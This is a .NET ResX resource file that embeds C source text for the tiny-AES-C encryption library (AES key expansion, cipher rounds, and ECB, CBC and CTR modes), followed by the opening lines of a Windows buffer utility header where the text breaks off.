<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="aes.c" xml:space="preserve">
    <value>/*

This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.

The implementation is verified against the test vectors in:
  National Institute of Standards and Technology Special Publication 800-38A 2001 ED

ECB-AES128
----------

  plain-text:
    6bc1bee22e409f96e93d7e117393172a
    ae2d8a571e03ac9c9eb76fac45af8e51
    30c81c46a35ce411e5fbc1191a0a52ef
    f69f2445df4f9b17ad2b417be66c3710

  key:
    2b7e151628aed2a6abf7158809cf4f3c

  resulting cipher
    3ad77bb40d7a3660a89ecaf32466ef97 
    f5d3d58503b9699de785895a96fdbaaf 
    43b1cd7f598ece23881b00e3ed030688 
    7b0c785e27e8ad3f8223207104725dd4 


NOTE:   String length must be evenly divisible by 16byte (str_len % 16 == 0)
        You should pad the end of the string with zeros if this is not the case.
        For AES192/256 the key size is proportionally larger.

*/


/*****************************************************************************/
/* Includes:                                                                 */
/*****************************************************************************/
#include &lt;string.h&gt; // CBC mode, for memset
#include "aes.h"

/*****************************************************************************/
/* Defines:                                                                  */
/*****************************************************************************/
// The number of columns comprising a state in AES. This is a constant in AES. Value=4
#define Nb 4

#if defined(AES256) &amp;&amp; (AES256 == 1)
    #define Nk 8
    #define Nr 14
#elif defined(AES192) &amp;&amp; (AES192 == 1)
    #define Nk 6
    #define Nr 12
#else
    #define Nk 4        // The number of 32 bit words in a key.
    #define Nr 10       // The number of rounds in AES Cipher.
#endif

// jcallan@github points out that declaring Multiply as a function 
// reduces code size considerably with the Keil ARM compiler.
// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
#ifndef MULTIPLY_AS_A_FUNCTION
  #define MULTIPLY_AS_A_FUNCTION 0
#endif




/*****************************************************************************/
/* Private variables:                                                        */
/*****************************************************************************/
// state - array holding the intermediate results during decryption.
typedef uint8_t state_t[4][4];



// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
// The numbers below can be computed dynamically trading ROM for RAM - 
// This can be useful in (embedded) bootloader applications, where ROM is often limited.
static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
static const uint8_t rsbox[256] = {
  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };
#endif

// The round constant word array, Rcon[i], contains the values given by 
// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
static const uint8_t Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };

/*
 * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
 * that you can remove most of the elements in the Rcon array, because they are unused.
 *
 * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
 * 
 * "Only the first some of these constants are actually used – up to rcon[10] for AES-128 (as 11 round keys are needed), 
 *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm."
 */


/*****************************************************************************/
/* Private functions:                                                        */
/*****************************************************************************/
/*
static uint8_t getSBoxValue(uint8_t num)
{
  return sbox[num];
}
*/
#define getSBoxValue(num) (sbox[(num)])

// This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
{
  unsigned i, j, k;
  uint8_t tempa[4]; // Used for the column/row operations
  
  // The first round key is the key itself.
  for (i = 0; i &lt; Nk; ++i)
  {
    RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
    RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
    RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
    RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
  }

  // All other round keys are found from the previous round keys.
  for (i = Nk; i &lt; Nb * (Nr + 1); ++i)
  {
    {
      k = (i - 1) * 4;
      tempa[0]=RoundKey[k + 0];
      tempa[1]=RoundKey[k + 1];
      tempa[2]=RoundKey[k + 2];
      tempa[3]=RoundKey[k + 3];

    }

    if (i % Nk == 0)
    {
      // This function shifts the 4 bytes in a word to the left once.
      // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]

      // Function RotWord()
      {
        const uint8_t u8tmp = tempa[0];
        tempa[0] = tempa[1];
        tempa[1] = tempa[2];
        tempa[2] = tempa[3];
        tempa[3] = u8tmp;
      }

      // SubWord() is a function that takes a four-byte input word and 
      // applies the S-box to each of the four bytes to produce an output word.

      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }

      tempa[0] = tempa[0] ^ Rcon[i/Nk];
    }
#if defined(AES256) &amp;&amp; (AES256 == 1)
    if (i % Nk == 4)
    {
      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }
    }
#endif
    j = i * 4; k=(i - Nk) * 4;
    RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
  }
}

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
{
  KeyExpansion(ctx-&gt;RoundKey, key);
}
#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
{
  KeyExpansion(ctx-&gt;RoundKey, key);
  memcpy (ctx-&gt;Iv, iv, AES_BLOCKLEN);
}
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
{
  memcpy (ctx-&gt;Iv, iv, AES_BLOCKLEN);
}
#endif

// This function adds the round key to state.
// The round key is added to the state by an XOR function.
static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
{
  uint8_t i,j;
  for (i = 0; i &lt; 4; ++i)
  {
    for (j = 0; j &lt; 4; ++j)
    {
      (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
    }
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void SubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i &lt; 4; ++i)
  {
    for (j = 0; j &lt; 4; ++j)
    {
      (*state)[j][i] = getSBoxValue((*state)[j][i]);
    }
  }
}

// The ShiftRows() function shifts the rows in the state to the left.
// Each row is shifted with different offset.
// Offset = Row number. So the first row is not shifted.
static void ShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to left  
  temp           = (*state)[0][1];
  (*state)[0][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[3][1];
  (*state)[3][1] = temp;

  // Rotate second row 2 columns to left  
  temp           = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp           = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to left
  temp           = (*state)[0][3];
  (*state)[0][3] = (*state)[3][3];
  (*state)[3][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[1][3];
  (*state)[1][3] = temp;
}

static uint8_t xtime(uint8_t x)
{
  return ((x&lt;&lt;1) ^ (((x&gt;&gt;7) &amp; 1) * 0x1b));
}

// MixColumns function mixes the columns of the state matrix
static void MixColumns(state_t* state)
{
  uint8_t i;
  uint8_t Tmp, Tm, t;
  for (i = 0; i &lt; 4; ++i)
  {  
    t   = (*state)[i][0];
    Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3] ;
    Tm  = (*state)[i][0] ^ (*state)[i][1] ; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][1] ^ (*state)[i][2] ; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][2] ^ (*state)[i][3] ; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][3] ^ t ;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp ;
  }
}

// Multiply is used to multiply numbers in the field GF(2^8)
// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
//       The compiler seems to be able to vectorize the operation better this way.
//       See https://github.com/kokke/tiny-AES-c/pull/34
#if MULTIPLY_AS_A_FUNCTION
static uint8_t Multiply(uint8_t x, uint8_t y)
{
  return (((y &amp; 1) * x) ^
       ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^
       ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^
       ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^
       ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
  }
#else
#define Multiply(x, y)                                \
      (  ((y &amp; 1) * x) ^                              \
      ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^                       \
      ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^                \
      ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^         \
      ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))   \

#endif

#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
/*
static uint8_t getSBoxInvert(uint8_t num)
{
  return rsbox[num];
}
*/
#define getSBoxInvert(num) (rsbox[(num)])

// MixColumns function mixes the columns of the state matrix.
// The method used to multiply may be difficult to understand for the inexperienced.
// Please use the references to gain more information.
static void InvMixColumns(state_t* state)
{
  int i;
  uint8_t a, b, c, d;
  for (i = 0; i &lt; 4; ++i)
  { 
    a = (*state)[i][0];
    b = (*state)[i][1];
    c = (*state)[i][2];
    d = (*state)[i][3];

    (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
    (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
    (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
  }
}


// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void InvSubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i &lt; 4; ++i)
  {
    for (j = 0; j &lt; 4; ++j)
    {
      (*state)[j][i] = getSBoxInvert((*state)[j][i]);
    }
  }
}

static void InvShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to right  
  temp = (*state)[3][1];
  (*state)[3][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[0][1];
  (*state)[0][1] = temp;

  // Rotate second row 2 columns to right 
  temp = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to right
  temp = (*state)[0][3];
  (*state)[0][3] = (*state)[1][3];
  (*state)[1][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[3][3];
  (*state)[3][3] = temp;
}
#endif // #if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)

// Cipher is the main function that encrypts the PlainText.
static void Cipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(0, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without MixColumns()
  for (round = 1; ; ++round)
  {
    SubBytes(state);
    ShiftRows(state);
    if (round == Nr) {
      break;
    }
    MixColumns(state);
    AddRoundKey(round, state, RoundKey);
  }
  // Add round key to last round
  AddRoundKey(Nr, state, RoundKey);
}

#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
static void InvCipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(Nr, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without InvMixColumn()
  for (round = (Nr - 1); ; --round)
  {
    InvShiftRows(state);
    InvSubBytes(state);
    AddRoundKey(round, state, RoundKey);
    if (round == 0) {
      break;
    }
    InvMixColumns(state);
  }

}
#endif // #if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)

/*****************************************************************************/
/* Public functions:                                                         */
/*****************************************************************************/
#if defined(ECB) &amp;&amp; (ECB == 1)


void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call encrypts the PlainText with the Key using AES algorithm.
  Cipher((state_t*)buf, ctx-&gt;RoundKey);
}

void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call decrypts the PlainText with the Key using AES algorithm.
  InvCipher((state_t*)buf, ctx-&gt;RoundKey);
}


#endif // #if defined(ECB) &amp;&amp; (ECB == 1)





#if defined(CBC) &amp;&amp; (CBC == 1)


static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
{
  uint8_t i;
  for (i = 0; i &lt; AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
  {
    buf[i] ^= Iv[i];
  }
}

void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t *Iv = ctx-&gt;Iv;
  for (i = 0; i &lt; length; i += AES_BLOCKLEN)
  {
    XorWithIv(buf, Iv);
    Cipher((state_t*)buf, ctx-&gt;RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
  }
  /* store Iv in ctx for next call */
  memcpy(ctx-&gt;Iv, Iv, AES_BLOCKLEN);
}

void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t storeNextIv[AES_BLOCKLEN];
  for (i = 0; i &lt; length; i += AES_BLOCKLEN)
  {
    memcpy(storeNextIv, buf, AES_BLOCKLEN);
    InvCipher((state_t*)buf, ctx-&gt;RoundKey);
    XorWithIv(buf, ctx-&gt;Iv);
    memcpy(ctx-&gt;Iv, storeNextIv, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }

}

#endif // #if defined(CBC) &amp;&amp; (CBC == 1)



#if defined(CTR) &amp;&amp; (CTR == 1)

/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  uint8_t buffer[AES_BLOCKLEN];
  
  size_t i;
  int bi;
  for (i = 0, bi = AES_BLOCKLEN; i &lt; length; ++i, ++bi)
  {
    if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
    {
      
      memcpy(buffer, ctx-&gt;Iv, AES_BLOCKLEN);
      Cipher((state_t*)buffer,ctx-&gt;RoundKey);

      /* Increment Iv and handle overflow */
      for (bi = (AES_BLOCKLEN - 1); bi &gt;= 0; --bi)
      {
 /* inc will overflow */
        if (ctx-&gt;Iv[bi] == 255)
 {
          ctx-&gt;Iv[bi] = 0;
          continue;
        } 
        ctx-&gt;Iv[bi] += 1;
        break;   
      }
      bi = 0;
    }

    buf[i] = (buf[i] ^ buffer[bi]);
  }
}

#endif // #if defined(CTR) &amp;&amp; (CTR == 1)
</value>
  </data>
  <data name="aes.h" xml:space="preserve">
    <value>#ifndef _AES_H_
#define _AES_H_

#include &lt;stdint.h&gt;
#include &lt;stddef.h&gt;

// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
#define CBC 1
#endif

#ifndef ECB
#define ECB 1
#endif

#ifndef CTR
#define CTR 1
#endif


#define AES128 1
//#define AES192 1
//#define AES256 1

#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only

#if defined(AES256) &amp;&amp; (AES256 == 1)
#define AES_KEYLEN 32
#define AES_keyExpSize 240
#elif defined(AES192) &amp;&amp; (AES192 == 1)
#define AES_KEYLEN 24
#define AES_keyExpSize 208
#else
#define AES_KEYLEN 16   // Key length in bytes
#define AES_keyExpSize 176
#endif

struct AES_ctx
{
    uint8_t RoundKey[AES_keyExpSize];
#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
    uint8_t Iv[AES_BLOCKLEN];
#endif
};

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif

#if defined(ECB) &amp;&amp; (ECB == 1)
// buffer size is exactly AES_BLOCKLEN bytes; 
// you need only AES_init_ctx as IV is not used in ECB 
// NB: ECB is considered insecure for most uses
void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);

#endif // #if defined(ECB) &amp;&amp; (ECB == !)


#if defined(CBC) &amp;&amp; (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CBC) &amp;&amp; (CBC == 1)


#if defined(CTR) &amp;&amp; (CTR == 1)

// Same function for encrypting as for decrypting. 
// IV is incremented for every block, and used after encryption as XOR-compliment for output
// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CTR) &amp;&amp; (CTR == 1)


#endif // _AES_H_</value>
  </data>
  <data name="aes.hpp" xml:space="preserve">
    <value>#ifndef _AES_HPP_
#define _AES_HPP_

#ifndef __cplusplus
#error Do not include the hpp header in a c project!
#endif //__cplusplus

extern "C" {
#include "aes.h"
}

#endif //_AES_HPP_</value>
  </data>
  <data name="buffer_util.h" xml:space="preserve">
    <value>#pragma once

#include &lt;windows.h&gt;

#define MAX_DWORD 0xffffffff
#define MAX_WORD 0xffff
